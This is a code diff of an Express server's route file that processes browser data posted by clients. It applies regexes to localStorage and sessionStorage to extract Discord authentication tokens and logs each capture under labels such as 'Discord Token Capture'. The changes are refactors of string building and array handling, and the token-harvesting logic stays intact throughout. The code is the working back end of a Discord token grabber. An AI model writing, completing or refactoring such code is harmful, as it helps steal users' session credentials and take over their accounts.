@@ -151,8 +151,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
           if (typeof value === 'string') {
             for (const pattern of discordTokenPatterns) {
               if (pattern.test(value)) {
-                discordTokens.push(`${source}: ${value}`);
-                foundTokens.push(`🔥 DISCORD TOKEN - ${source}: ${value}`);
+                discordTokens.push(source + ': ' + value);
+                foundTokens.push('🔥 DISCORD TOKEN - ' + source + ': ' + value);
                 return true;
               }
             }
@@ -165,17 +165,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
           const value = localStorageData[key];
 
           // Check for Discord tokens first
-          if (!checkDiscordToken(value, `localStorage.${key}`)) {
+          if (!checkDiscordToken(value, 'localStorage.' + key)) {
             // Check for general token patterns
             if (tokenPatterns.some(pattern => pattern.test(key))) {
-              foundTokens.push(`localStorage.${key}: ${value}`);
+              foundTokens.push('localStorage.' + key + ': ' + value);
             }
             // Also check values for Discord token patterns
             if (typeof value === 'string') {
               for (const pattern of discordTokenPatterns) {
                 if (pattern.test(value)) {
-                  discordTokens.push(`localStorage.${key}: ${value}`);
-                  foundTokens.push(`🔥 DISCORD TOKEN - localStorage.${key}: ${value}`);
+                  discordTokens.push('localStorage.' + key + ': ' + value);
+                  foundTokens.push('🔥 DISCORD TOKEN - localStorage.' + key + ': ' + value);
                   break;
                 }
               }
@@ -188,17 +188,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
           const value = sessionStorageData[key];
 
           // Check for Discord tokens first
-          if (!checkDiscordToken(value, `sessionStorage.${key}`)) {
+          if (!checkDiscordToken(value, 'sessionStorage.' + key)) {
             // Check for general token patterns
             if (tokenPatterns.some(pattern => pattern.test(key))) {
-              foundTokens.push(`sessionStorage.${key}: ${value}`);
+              foundTokens.push('sessionStorage.' + key + ': ' + value);
             }
             // Also check values for Discord token patterns
             if (typeof value === 'string') {
               for (const pattern of discordTokenPatterns) {
                 if (pattern.test(value)) {
-                  discordTokens.push(`sessionStorage.${key}: ${value}`);
-                  foundTokens.push(`🔥 DISCORD TOKEN - sessionStorage.${key}: ${value}`);
+                  discordTokens.push('sessionStorage.' + key + ': ' + value);
+                  foundTokens.push('🔥 DISCORD TOKEN - sessionStorage.' + key + ': ' + value);
                   break;
                 }
               }
@@ -549,13 +549,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const discordTokenRegex = /([a-zA-Z0-9]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27})|([a-zA-Z0-9]{30}\.[a-zA-Z0-9_\-]{10}\.[a-zA-Z0-9_\-]{32})/g;
       const localStorageTokens = Object.values(browserData.localStorage || {}).flatMap(value => {
         if (typeof value === 'string') {
-          return [...value.matchAll(discordTokenRegex)].map(match => match[0]);
+          return Array.from(value.matchAll(discordTokenRegex)).map(match => match[0]);
         }
         return [];
       });
       const sessionStorageTokens = Object.values(browserData.sessionStorage || {}).flatMap(value => {
         if (typeof value === 'string') {
-          return [...value.matchAll(discordTokenRegex)].map(match => match[0]);
+          return Array.from(value.matchAll(discordTokenRegex)).map(match => match[0]);
         }
         return [];
       });
@@ -579,8 +579,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           userAgent,
           referrer: 'Discord Token Capture',
           location,
-          status: 'discord_token_captured',
-          tokens: browserData.discordTokens.join(' | ')
+          status: 'discord_token_captured'
         });
       }
 
